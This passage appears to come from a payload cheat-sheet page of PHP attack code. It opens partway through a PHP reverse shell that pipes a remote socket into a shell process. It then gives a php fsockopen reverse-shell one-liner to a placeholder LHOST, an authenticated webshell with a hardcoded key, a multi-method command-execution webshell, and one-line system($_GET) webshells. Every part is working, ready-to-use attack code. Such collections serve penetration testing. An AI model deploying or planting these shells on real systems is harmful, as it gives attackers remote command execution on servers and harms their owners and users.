stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```
{% endraw %}

### fsockopen one-liner (Linux, php)

_Platform: Linux/Unix_

{% raw %}
```php
php -r '$sock=fsockopen("§LHOST§",§LPORT§);exec("/bin/bash <&3 >&3 2>&3");'
```
{% endraw %}

### Webshell (cross-platform, authenticated)

_Platform: Linux/Unix && Windows_

{% raw %}
```php
<?php
$secretKey = 'YourMomHeetsHenk!@4';
$auth = $_GET['auth'] ?? '';
$method = $_GET['method'] ?? '';
$cmd = $_GET['cmd'] ?? '';
$output = '';

if ($auth !== $secretKey) {
    http_response_code(403);
    echo "<h2>403 Forbidden</h2>";
    exit;
}

if (!empty($method) && !empty($cmd)) {
    switch ($method) {
        case 'shell_exec':
            $output = shell_exec($cmd);
            break;
        case 'system':
            ob_start();
            system($cmd);
            $output = ob_get_clean();
            break;
        case 'passthru':
            ob_start();
            passthru($cmd);
            $output = ob_get_clean();
            break;
        case 'exec':
            $output = exec($cmd);
            break;
        default:
            $output = "Invalid method selected.";
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>PHP Web Shell</title>
    <style>
        body {
            background-color: #1a1a1a;
            color: #f0f0f0;
            font-family: Consolas, monospace;
            padding: 20px;
        }
        form {
            margin-bottom: 20px;
        }
        select, input[type="text"] {
            width: 60%%;
            padding: 8px;
            background-color: #2e2e2e;
            color: #fff;
            border: 1px solid #444;
            margin-bottom: 10px;
        }
        input[type="submit"] {
            padding: 8px 16px;
            background-color: #007acc;
            color: white;
            border: none;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #005fa3;
        }
        pre {
            background-color: #111;
            padding: 15px;
            border: 1px solid #333;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <h2>PHP Authenticated Web Shell</h2>
    <form method="get">
        <input type="hidden" name="auth" value="<?= htmlspecialchars($secretKey) ?>" />

        <label for="method">Choose Method:</label><br />
        <select name="method" id="method" required>
            <option value="">-- Select Method --</option>
            <option value="shell_exec" <?= $method === 'shell_exec' ? 'selected' : '' ?>>shell_exec</option>
            <option value="system" <?= $method === 'system' ? 'selected' : '' ?>>system</option>
            <option value="passthru" <?= $method === 'passthru' ? 'selected' : '' ?>>passthru</option>
            <option value="exec" <?= $method === 'exec' ? 'selected' : '' ?>>exec</option>
        </select><br /><br />

        <label for="cmd">Enter Command:</label><br />
        <input type="text" name="cmd" id="cmd" value="<?= htmlspecialchars($cmd) ?>" required /><br /><br />

        <input type="submit" value="Execute Command" />
    </form>

    <?php if (!empty($output)): ?>
        <h3>Output:</h3>
        <pre><?= htmlspecialchars($output) ?></pre>
    <?php endif; ?>
</body>
</html>
```
{% endraw %}

### Webshell (cross-platform, multi-method)

_Platform: Linux/Unix && Windows_

{% raw %}
```php
<?php
if(isset($_GET['m'],$_GET['c'])){
  $m=$_GET['m'];$c=$_GET['c'];
  echo "<b>$m</b>: <b>$c</b><br><pre>";
  if($m=='exec'){exec($c,$o);echo join("\n",$o);}
  if($m=='shell_exec')echo shell_exec($c);
  if($m=='system'){ob_start();system($c);echo ob_get_clean();}
  if($m=='passthru'){ob_start();passthru($c);echo ob_get_clean();}
  if($m=='popen'){$h=popen($c,'r');while(!feof($h))echo fread($h,1024);pclose($h);}
  if($m=='proc_open'){$d=[0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","w"]];$p=proc_open($c,$d,$pipes);echo stream_get_contents($pipes[1]);fclose($pipes[1]);proc_close($p);}
  echo "</pre>";
}else echo "Usage: ?m=exec&c=whoami";
?>
```
{% endraw %}

### Webshell (cross-platform, one-liner)

_Platform: Linux/Unix && Windows_

{% raw %}
```php
# 1. using cmd > ?cmd=id
<?php system($_GET['cmd']); ?>

# 2. using an integer > ?0=id
<?php echo system($_GET[0]) ?>
```
{% endraw %}
